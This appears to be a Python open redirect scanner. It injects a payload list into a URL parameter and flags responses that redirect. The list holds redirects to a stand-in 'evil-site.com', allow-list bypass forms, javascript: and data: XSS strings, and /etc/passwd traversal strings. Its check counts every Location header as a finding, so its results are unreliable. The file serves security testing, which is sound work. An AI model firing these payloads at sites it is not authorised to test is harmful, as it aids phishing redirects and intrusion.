from urllib.parse import urlparse, parse_qs, urlencode
import requests

# List of payloads for open redirect testing
PAYLOADS = [
    # Absolute URLs
    "https://evil-site.com",
    "http://malicious-site.com",

    # Relative URLs
    "/path/to/resource",
    "../vulnerable-page",
    "./internal-page",

    # JavaScript URIs
    "javascript:alert('XSS')",
    "javascript:void(0)",
    "javascript:document.location='https://evil-site.com'",

    # Data URIs
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",

    # Encoded URLs
    "%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2D%73%69%74%65%2E%63%6F%6D",  # https://evil-site.com
    "%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%58%53%53%27%29",  # javascript:alert('XSS')

    # Protocol Handlers
    "mailto:user@example.com",
    "tel:+1234567890",
    "file:///etc/passwd",

    # Double Slashes
    "//evil-site.com",
    "//subdomain.evil-site.com/path",

    # Null Byte Injection
    "https://evil-site.com%00",
    "https://legit-site.com%00.evil-site.com",

    # Path Traversal
    "../../../../etc/passwd",
    "../admin-panel",

    # Whitelisted Domains
    "https://trusted-domain.com.evil-site.com",
    "https://trusted-domain.com@evil-site.com",
    "https://trusted-domain.com?evil-site.com",

    # Base64-Encoded Redirects
    "aHR0cHM6Ly9ldmlsLXNpdGUuY29t",  # Base64-encoded https://evil-site.com

    # Query Parameters
    "https://legit-site.com?redirect=https://evil-site.com",

    # Fragment Identifiers
    "https://legit-site.com#https://evil-site.com"
]


# Check if a string looks like a URL
def is_url_like(value):
    try:
        result = urlparse(value)
        return all([result.scheme, result.netloc])  # Check if scheme and netloc are present
    except Exception:
        return False


# Test for open redirects
def test_open_redirect(base_url, param, payloads):
    found_redirects = []  # Store successful findings

    for payload in payloads:
        try:
            # Construct the test URL by replacing the original value with the payload
            parsed_url = urlparse(base_url)
            query_params = parse_qs(parsed_url.query)
            query_params[param] = payload  # Replace the parameter value with the payload

            # Rebuild the URL with the modified query parameters
            modified_query = urlencode(query_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"

            # Send a GET request to the test URL
            response = requests.get(test_url, allow_redirects=False, timeout=10)

            # Check the response headers for a redirect
            if "Location" in response.headers:
                location = response.headers["Location"]
                print(f"[+] Open Redirect Found! Payload: {payload} -> Redirects to: {location}")
                found_redirects.append((test_url, payload, location))  # Save the finding
        except Exception as e:
            print(f"[!] Error testing payload {payload}: {e}")

    return found_redirects